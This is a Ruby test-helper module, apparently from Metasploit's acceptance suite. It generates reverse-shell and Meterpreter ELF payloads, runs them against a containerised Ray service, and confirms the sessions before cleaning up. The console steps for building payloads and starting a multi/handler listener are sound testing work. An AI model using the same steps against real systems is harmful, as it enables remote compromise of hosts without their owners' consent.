# frozen_string_literal: true

require 'digest'
require 'English'
require 'securerandom'
require 'timeout'
require_relative '../../../tools/dev/run_module_target_tests'

module Acceptance
  # Existing Linux/Gogs controllers assume different service/user names.
  # Keep Ray's SDK/identity boundary here, reusing the common console runner and
  # existing read-only socket observer rather than changing qualified helpers.
  module RayJobs
    def ray_poll(seconds, &block)
      Timeout.timeout(seconds) { wait_for_expect(300, 0.1, &block) }
    end

    def ray_native(action, **options)
      @ray_sequence[:value] += 1
      name = "ray-native-#{@ray_sequence.fetch(:value)}-#{action}"
      argv = target_runtime.fetch('compose') + ['exec', '-T', 'ray', 'python', '/module-target/jobs-observer.py', JSON.generate(options.merge(action: action))]
      output = +''
      path = File.join(target_runtime.fetch('artifacts'), "#{name}.log")
      expect(ModuleTargetTests.new.send(:command, argv, path: path, timeout: 90, capture: output, quiet: true)).to be(true), output
      lines = output.lines.grep(/^MODULE_TARGET_JOBS_JSON:/)
      expect(lines.length).to eq(1), output
      JSON.parse(lines.first.delete_prefix('MODULE_TARGET_JOBS_JSON:'))
    end

    def ray_native_phase(phase)
      argv = ['python3', '-B', 'test/module_targets/ray/native_runtime.py', ENV.fetch('MODULE_TARGET_RUNTIME'), phase]
      output = +''
      path = File.join(target_runtime.fetch('artifacts'), "native-#{phase}.log")
      expect(ModuleTargetTests.new.send(:command, argv, path: path, timeout: 300, capture: output, quiet: true)).to be(true), output
      result = JSON.parse(File.read(File.join(target_runtime.fetch('artifacts'), "native-#{phase}/native-result.json")))
      expect(result.fetch('status')).to eq('native_passed')
    end

    def ray_listener_rows(port)
      source = 'require "json"; port=Integer(ARGV.fetch(0)); rows=%w[/proc/net/tcp /proc/net/tcp6].flat_map { |path| File.readlines(path).drop(1).map(&:split) }; puts JSON.generate(rows.select { |row| row[3]=="0A" && row[1].split(":").last.to_i(16)==port })'
      JSON.parse(target_exec('framework', 'ruby', '-e', source, port.to_s))
    end

    def ray_connections(port)
      source = File.read('test/module_targets/superset_rce_owner/connection_state.py')
      JSON.parse(target_exec('ray', 'python', '-c', source, listener_host, port.to_s))
    end

    def ray_session_proof(identifier, payload, port, phase:)
      meterpreter = payload.include?('meterpreter')
      proof = File.join(@ray_root, "session-proof-#{SecureRandom.hex(6)}")
      record = { phase: phase, payload: payload, session: identifier, port: port, proof: proof }
      begin
        if meterpreter
          output = console_command("sessions -i #{identifier} -C getpid")
          pid = output[/Current pid: (\d+)/, 1]
          output = console_command("sessions -i #{identifier} -C #{"execute -f /usr/bin/touch -a #{proof}".inspect}")
        else
          output = console_command("sessions -i #{identifier} -c #{"/usr/bin/touch #{proof}; printf 'RAY_SHELL_PID=%s\\n' $$".inspect}")
          pid = output[/^RAY_SHELL_PID=(\d+)\r?$/, 1]
        end
        expect(pid).not_to be_nil, output
        expect(output).not_to match(/\[-\]|Exception|Unknown command/)
        ray_poll(15) { expect(target_exec('ray', 'stat', '-c', '%u:%g', proof).strip).to eq('1000:100') }
        expect(target_exec('ray', 'cat', "/proc/#{pid}/status")).to match(/^Uid:\s+1000\s+1000\s+1000\s+1000$/)
        connections = ray_connections(port)
        expect(connections.flat_map { |row| row.fetch('owners') }).to include(include('pid' => pid.to_i, 'uid' => 1000))
        record[:pid] = pid.to_i
        record[:native_connections] = connections
        shutdown = meterpreter ? "framework.sessions[#{identifier}].exit" : "framework.sessions[#{identifier}].shell_write(\"exit\\n\")"
        expect(console_command("irb -e #{shutdown.inspect}")).not_to match(/\[-\]|Exception|Unknown command/)
        ray_poll(20) do
          expect(target_exec('ray', 'sh', '-c', 'if test -e "$1"; then printf PRESENT; else printf ABSENT; fi', 'sh', "/proc/#{pid}")).to eq('ABSENT')
        end
        ray_poll(20) { expect(ray_connections(port)).to eq([]) }
        console_command("irb -e #{"framework.sessions[#{identifier}]&.shell_close".inspect}") unless meterpreter
        ray_poll(20) { expect(console_command('sessions -l')).to include('No active sessions') }
        record[:target_pid_absent] = true
        record[:target_socket_absent] = true
        record[:host_session_absent] = true
      ensure
        failure = $ERROR_INFO
        record[:error] = { class: failure.class.name, message: failure.message } if failure
        target_exec('ray', 'rm', '-f', proof)
        File.open(File.join(target_runtime.fetch('artifacts'), 'ray-session-lifecycle.jsonl'), 'a') { |file| file.puts(JSON.generate(record)) }
      end
    end

    def ray_calibrate(payload, port, fork: false)
      artifact = File.join(target_runtime.fetch('artifacts'), "native-#{port}.elf")
      remote = "/tmp/module-target-ray-calibration-#{port}.elf"
      record = { payload: payload, port: port, owner_calls: 0, passed: false }
      begin
        console_command('back')
        console_command("use payload/#{payload}")
        console_command("set LHOST #{listener_host}")
        console_command("set LPORT #{port}")
        console_command('set MeterpreterTryToFork true') if fork
        expect(console_command("generate -f elf -o #{artifact}")).not_to match(/\[-\]|Exception|Unknown command/)
        raw = File.binread(artifact)
        expect(raw).to start_with("\x7fELF".b)
        File.chmod(0o644, artifact)
        record[:payload_bytes] = raw.bytesize
        record[:payload_sha256] = Digest::SHA256.hexdigest(raw)
        console_command('back')
        console_command('use exploit/multi/handler')
        console_command("set PAYLOAD #{payload}")
        console_command("set LHOST #{listener_host}")
        console_command("set LPORT #{port}")
        console_command('set ExitOnSession false')
        expect(console_command('run -j -z')).not_to include('[-]')
        ray_poll(15) { expect(ray_listener_rows(port)).not_to be_empty }
        launched = ray_native('launch', source: artifact, path: remote)
        expect(launched).to include('uid' => 1000, 'gid' => 100, 'bytes' => raw.bytesize)
        identifier = ray_wait_session(payload)
        record[:session] = identifier
        ray_session_proof(identifier, payload, port, phase: 'Independent native payload calibration')
        record[:passed] = true
      ensure
        failure = $ERROR_INFO
        errors = []
        [
          ['sessions', -> { console_command('sessions -K') }],
          ['jobs', -> { console_command('jobs -K') }],
          ['target sockets', -> { ray_poll(15) { expect(ray_connections(port)).to eq([]) } }],
          ['listener', -> { ray_poll(15) { expect(ray_listener_rows(port)).to eq([]) } }],
          ['payload files', -> { target_exec('ray', 'rm', '-f', remote, remote.sub(/\.elf\z/, '.log')) }]
        ].each do |operation, cleanup|
          cleanup.call
        rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
          errors << { operation: operation, class: e.class.name, message: e.message }
        end
        record[:error] = { class: failure.class.name, message: failure.message } if failure
        record[:cleanup_errors] = errors
        record[:passed] = record[:passed] && !failure && errors.empty?
        File.open(File.join(target_runtime.fetch('artifacts'), 'ray-native-calibrations.jsonl'), 'a') { |file| file.puts(JSON.generate(record)) }
        raise "Native calibration cleanup failed: #{errors.inspect}" if !failure && !errors.empty?
      end
    end

    def ray_wait_session(payload)
      identifier = nil
      meterpreter = payload.include?('meterpreter')
      ray_poll(40) do
        output = console_command('sessions -l')
        identifier = output[/^\s*(\d+)\s+.*\b#{meterpreter ? 'meterpreter' : 'shell'}\b/i, 1]
        expect(identifier).not_to be_nil, output
        expect(console.all_data).to include("#{meterpreter ? 'Meterpreter' : 'Command shell'} session #{identifier} opened")
      end
      identifier
    end
  end
end
